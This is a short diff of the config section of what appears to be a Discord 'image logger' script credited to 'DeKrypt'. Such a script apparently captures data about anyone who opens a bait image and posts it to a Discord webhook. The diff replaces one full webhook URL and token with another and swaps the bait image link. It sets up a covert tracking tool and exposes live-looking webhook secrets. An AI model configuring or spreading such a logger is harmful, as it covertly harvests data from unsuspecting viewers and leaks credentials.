@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1229853561727488061/hSkXeaOIje_QnYL-0qpckjCvyqyktB23loFSpgt_Qj_if-E87LdqSlIUTZpqLyHs_iDW",
-    "image": "https://images91.fotosik.pl/715/651458286cc91f44med.png", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1229856661091385344/KHIGchXaMZQ-FCDiHu4sr2qnOj-KX_P033LL1JV2G2pZ6pJtUvV1jIUCI2vZC5vYcMde",
+    "image": "https://www.e-tapetki.pl/tapetki/duze/341563_dwie-skala-aby-mech.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
